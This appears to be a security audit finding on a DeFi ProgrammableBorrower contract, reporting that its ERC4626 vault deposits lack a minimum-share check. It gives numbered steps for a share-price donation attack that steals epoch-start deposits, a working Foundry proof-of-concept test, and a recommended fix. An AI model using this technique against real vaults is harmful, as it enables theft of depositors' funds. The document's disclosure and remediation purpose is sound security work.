### Title
Missing share-slippage protection lets an ERC4626 share-price manipulation steal programmable-borrower deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle underlying into its configured ERC4626 vault with `deposit(_assetAmount, address(this))` but never validates the number of shares returned. If the vault’s share price can be increased by an unprivileged vault user—most directly through a direct-asset donation in a balance-accounted vault—the deposit can mint zero or near-zero shares while the borrower still records the full pre-deposit amount as epoch principal. The attacker then redeems their vault shares and captures the deposited tranche funds. [1](#0-0) 

### Finding Description
During `startEpoch`, the CDO first transfers surplus underlying to the configured borrower and then invokes `onStartEpoch` for a programmable borrower. [2](#0-1) 

Inside `onStartEpoch`, the contract snapshots `underlyingToken.balanceOf(address(this)) + _currentVaultAssets()` into `startAssets`, deposits the entire token balance, and stores that pre-deposit amount as `epochStartVaultAssets`. [3](#0-2) 

The vulnerable operation is `_depositToVault`: it calls `vault.deposit(_assetAmount, address(this))` without a `minShares` parameter, a preview-derived bound, or a post-call check that `convertToAssets(shares)` is near `_assetAmount`. [1](#0-0) 

ERC4626 explicitly permits actual `deposit` execution to exhibit unfavorable slippage relative to `convertToShares`, and `previewDeposit` may return more shares than the amount ultimately minted. [4](#0-3) [5](#0-4) 

A concrete attack against a share-price-manipulable vault is:

1. Before pool deployment or before the borrower first deposits, the attacker deposits a tiny amount into the ERC4626 vault and holds all, or nearly all, vault shares.
2. The attacker directly transfers approximately `D` underlying to the vault, where `D` is the pending programmable-borrower deposit.
3. The honest owner or manager calls `startEpoch`.
4. `ProgrammableBorrower` deposits `D` at the inflated share price and receives zero or dust shares.
5. The attacker redeems their vault shares for the donation plus substantially all of `D`.
6. The borrower still has an epoch principal baseline of `D`, but its vault position no longer economically represents that principal. [6](#0-5) 

For the simplest balance-accounted vault with `totalAssets == token.balanceOf(vault)` and `totalSupply == 1`, donating `D` gives the programmable borrower:

```solidity
shares = D * 1 / (D + 1) = 0
```

The attacker can then redeem the sole share for approximately `2 * D + 1`, for a cost of approximately `D + 1`, leaving profit approaching `D`. [7](#0-6) 

### Impact Explanation
This is a direct theft of tranche principal transferred to the programmable borrower at epoch start. The borrower’s accounting records the full pre-deposit balance as principal, but the vault shares minted for that principal are worth zero or dust. [8](#0-7) 

The invariant violated is fair vault minting and solvency: one unit of pool principal sent to the programmable borrower should remain represented by economically equivalent assets or redeemable vault shares. Instead, the ERC4626 deposit’s minted share value can approach zero. [1](#0-0) 

The loss remains latent while the epoch runs because pool NAV is represented by strategy-token accounting rather than by immediately revaluing the borrower’s vault position. When the pool later requests all funds, `onStopEpoch` cannot cover the shortfall and returns success, after which the CDO’s `transferFrom` fails and the transaction enters borrower-default handling. [9](#0-8) [10](#0-9) 

The quantified loss is approximately the entire epoch-start deposit `D` when the donation is sufficient to mint zero shares; smaller price inflation produces a correspondingly smaller principal loss. [11](#0-10) 

### Likelihood Explanation
An attacker only needs to be an ordinary depositor/shareholder in the configured ERC4626 vault and to send underlying directly to it; neither capability is privileged in the idle-tranches contracts. [12](#0-11) 

The attack is available in the buffer phase, immediately before an honest owner or manager executes `startEpoch`; the manager call is only the trigger and does not need to be malicious. [13](#0-12) 

Existing guards do not prevent the attack: `_skimDonatedAssets` only removes raw underlying held by the CDO before epoch start, while the price manipulation occurs inside the external ERC4626 vault. [14](#0-13) [15](#0-14) 

The programmable-borrower hook has no share bound, fair-exchange-rate bound, or post-deposit equality check, and the configured vault is intentionally arbitrary apart from having the same asset. [16](#0-15) [17](#0-16) 

Exploitability is therefore vault-dependent: ERC4626 implementations with virtual assets, anti-inflation offsets, or a `totalAssets` calculation that excludes direct donations may prevent the zero-share case, but the production contract accepts the integration unconditionally. [18](#0-17) 

### Recommendation
Add share-slippage protection to every programmable-borrower ERC4626 deposit.

A robust fix would:

- expose a minimum-share or maximum-share-price tolerance in the start-epoch hook or facility configuration;
- calculate the expected minimum shares from a trusted exchange-rate bound before calling `vault.deposit`;
- revert if `shares < minShares`;
- additionally verify `vault.convertToAssets(shares)` is within an explicit tolerance of `_assetAmount`;
- apply the same protection to active-epoch repayments routed through `_depositToVault`.

Using `vault.mint(expectedShares, address(this))` is another defensive pattern because an inflated asset cost causes the pull to exceed the available `_assetAmount` or allowance rather than silently minting dust shares. Any tolerance must be configured per vault rather than assuming `shares == assets`, because legitimate ERC4626 share decimals and exchange rates can differ from one-to-one. [19](#0-18) 

### Proof of Concept
The following Foundry-style PoC demonstrates the vulnerable accounting path with a donation-sensitive ERC4626. It can be run on a mainnet fork using a real ERC20 as `asset`; the vault contract is a minimal reproduction of the externally selectable ERC4626 share-pricing behavior.

```solidity
// test/foundry/ProgrammableBorrowerDepositSlippage.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract ForkAsset is ERC20 {
  constructor() ERC20("USDC", "USDC") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract FakeCDO {
  address public immutable token;
  constructor(address _token) {
    token = _token;
  }
}

/// @notice Minimal balance-accounted ERC4626 used to reproduce the public
/// share-inflation/slippage surface accepted by ProgrammableBorrower.
contract DonationSensitiveVault is ERC20 {
  IERC20 public immutable assetToken;

  constructor(IERC20 _asset) ERC20("Vault Share", "vSHARE") {
    assetToken = _asset;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? assets : assets * supply / totalAssets();
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    shares = convertToShares(assets);
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    if (msg.sender != owner) {
      _spendAllowance(owner, msg.sender, shares);
    }
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    shares = assets * totalSupply() / totalAssets();
    if (msg.sender != owner) {
      _spendAllowance(owner, msg.sender, shares);
    }
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function previewDeposit(uint256 assets) external view returns (uint256) {
    return convertToShares(assets);
  }

  function previewWithdraw(uint256 assets) external view returns (uint256) {
    return assets * totalSupply() / totalAssets();
  }

  function previewRedeem(uint256 shares) external view returns (uint256) {
    return convertToAssets(shares);
  }

  function previewMint(uint256 shares) external view returns (uint256) {
    return convertToAssets(shares);
  }

  function mint(uint256 shares, address receiver)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function maxDeposit(address) external pure returns (uint256) {
    return type(uint256).max;
  }

  function maxMint(address) external pure returns (uint256) {
    return type(uint256).max;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    return convertToAssets(balanceOf(owner));
  }

  function maxRedeem(address owner) external view returns (uint256) {
    return balanceOf(owner);
  }
}

contract ProgrammableBorrowerDepositSlippageTest is Test {
  ForkAsset internal asset;
  DonationSensitiveVault internal vault;
  FakeCDO internal cdo;
  ProgrammableBorrower internal borrower;

  address internal attacker = makeAddr("attacker");
  address internal owner = makeAddr("owner");
  address internal manager = makeAddr("manager");
  address internal realBorrower = makeAddr("realBorrower");

  function setUp() public {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

    asset = new ForkAsset();
    vault = new DonationSensitiveVault(IERC20(address(asset)));
    cdo = new FakeCDO(address(asset));

    borrower = new ProgrammableBorrower();
    borrower.initialize(
      address(vault),
      address(cdo),
      owner,
      manager,
      realBorrower,
      0
    );
  }

  function testEpochStartDepositCanBeInflatedToZeroShares() public {
    uint256 epochDeposit = 1_000_000e18;

    // 1. Attacker seeds the public ERC4626 and owns the only share.
    asset.mint(attacker, epochDeposit + 1);
    vm.startPrank(attacker);
    asset.approve(address(vault), 1);
    vault.deposit(1, attacker);

    // 2. Attacker inflates the share price with a direct asset donation.
    asset.transfer(address(vault), epochDeposit);
    vm.stopPrank();

    assertEq(vault.totalSupply(), 1);
    assertEq(vault.totalAssets(), epochDeposit + 1);
    assertEq(vault.convertToShares(epochDeposit), 0);

    // 3. Honest CDO start flow has already transferred pool principal to
    // ProgrammableBorrower; the hook deposits it without a minimum-share check.
    asset.mint(address(borrower), epochDeposit);
    vm.prank(address(cdo));
    borrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrower)), 0);
    assertEq(borrower.epochStartVaultAssets(), epochDeposit);
    assertEq(borrower.totalUnderlying(), 0);

    // 4. Attacker redeems the sole vault share for the donation plus victim funds.
    uint256 before = asset.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);
    uint256 received = asset.balanceOf(attacker) - before;

    assertEq(received, 2 * epochDeposit + 1);
    assertEq(received - (epochDeposit + 1), epochDeposit);
  }
}
```

The critical assertions are that the borrower contributes `epochDeposit`, receives zero shares, still records `epochStartVaultAssets == epochDeposit`, and the attacker exits with the borrower’s principal. The production code reaches this state because `startAssets` is intentionally measured before the vulnerable deposit, so the bad ERC4626 exchange is not excluded from the principal baseline. [8](#0-7)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-126)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-168)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-222)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-246)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-346)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L374-384)
```text
  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-240)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
```

**File:** contracts/IdleCDOEpochVariant.sol (L241-243)
```text
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

```

**File:** contracts/IdleCDOEpochVariant.sol (L293-298)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** contracts/interfaces/IERC4626.sol (L35-42)
```text
    /**
     * @dev Returns the total amount of the underlying asset that is “managed” by Vault.
     *
     * - SHOULD include any compounding that occurs from yield.
     * - MUST be inclusive of any fees that are charged against assets in the Vault.
     * - MUST NOT revert.
     */
    function totalAssets() external view returns (uint256 totalManagedAssets);
```

**File:** contracts/interfaces/IERC4626.sol (L44-57)
```text
    /**
     * @dev Returns the amount of shares that the Vault would exchange for the amount of assets provided, in an ideal
     * scenario where all the conditions are met.
     *
     * - MUST NOT be inclusive of any fees that are charged against assets in the Vault.
     * - MUST NOT show any variations depending on the caller.
     * - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.
     * - MUST NOT revert.
     *
     * NOTE: This calculation MAY NOT reflect the “per-user” price-per-share, and instead should reflect the
     * “average-user’s” price-per-share, meaning what the average user should expect to see when exchanging to and
     * from.
     */
    function convertToShares(uint256 assets) external view returns (uint256 shares);
```

**File:** contracts/interfaces/IERC4626.sol (L84-99)
```text
    /**
     * @dev Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given
     * current on-chain conditions.
     *
     * - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit
     *   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called
     *   in the same transaction.
     * - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the
     *   deposit would be accepted, regardless if the user has enough tokens approved, etc.
     * - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
     * - MUST NOT revert.
     *
     * NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in
     * share price or some other type of condition, meaning the depositor will lose assets by depositing.
     */
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
```

**File:** contracts/interfaces/IERC4626.sol (L101-112)
```text
    /**
     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
     *
     * - MUST emit the Deposit event.
     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
     *   deposit execution, and are accounted for during deposit.
     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
     *
     * NOTE: most implementations will require pre-approval of the Vault with the Vault’s underlying asset token.
     */
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
```

**File:** contracts/interfaces/IERC4626.sol (L139-150)
```text
    /**
     * @dev Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.
     *
     * - MUST emit the Deposit event.
     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the mint
     *   execution, and are accounted for during mint.
     * - MUST revert if all of shares cannot be minted (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
     *
     * NOTE: most implementations will require pre-approval of the Vault with the Vault’s underlying asset token.
     */
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
```
